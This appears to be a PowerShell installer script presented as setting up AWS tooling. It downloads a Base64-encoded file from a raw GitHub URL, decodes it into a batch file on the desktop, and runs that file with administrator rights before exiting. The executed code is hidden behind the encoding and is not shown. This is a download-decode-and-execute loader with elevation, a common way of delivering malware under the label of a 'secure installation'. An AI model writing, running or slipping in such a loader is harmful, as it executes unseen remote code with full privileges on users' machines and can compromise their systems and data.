# Requires -Version 5.1
[CmdletBinding()]
param()

$repoBase = "https://raw.githubusercontent.com/sahmsec/Cyberfox/main"
$batUrl = "$repoBase/aws-install.bat"  # This file contains Base64 text now

# Get desktop path dynamically
$desktopPath = [Environment]::GetFolderPath("Desktop")

# Define AWS folder path on desktop
$awsFolder = Join-Path -Path $desktopPath -ChildPath "AWS"

# Create AWS folder if it does not exist
if (-not (Test-Path -Path $awsFolder -PathType Container)) {
    New-Item -Path $awsFolder -ItemType Directory | Out-Null
}

# Define full path for the batch file inside the AWS folder with timestamp
$batFile = Join-Path -Path $awsFolder -ChildPath "aws-install-$(Get-Date -Format 'yyyyMMddHHmmss').bat"

try {
    # Use TLS 1.2+
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    # Suppress progress display
    $oldProgressPreference = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'

    Write-Host "Downloading Base64-encoded batch file to $awsFolder ..." -ForegroundColor Cyan

    # Download Base64 content from GitHub
    $base64Content = Invoke-WebRequest -Uri $batUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content

    # Restore progress preference
    $ProgressPreference = $oldProgressPreference

    Write-Host "Decoding and saving batch file..." -ForegroundColor Cyan

    # Decode Base64 content to bytes
    $bytes = [Convert]::FromBase64String($base64Content)

    # Save decoded batch file to disk
    [IO.File]::WriteAllBytes($batFile, $bytes)

    Write-Host "`nSaved decoded batch file to: $batFile" -ForegroundColor Cyan

    Write-Host "Starting secure installation..." -ForegroundColor Green

    # Launch batch file elevated and immediately exit PowerShell
    Start-Process -FilePath $batFile -Verb RunAs
    exit

} catch {
    Write-Host "`n[ERROR] Installation failed: $_" -ForegroundColor Red
    exit 1
}
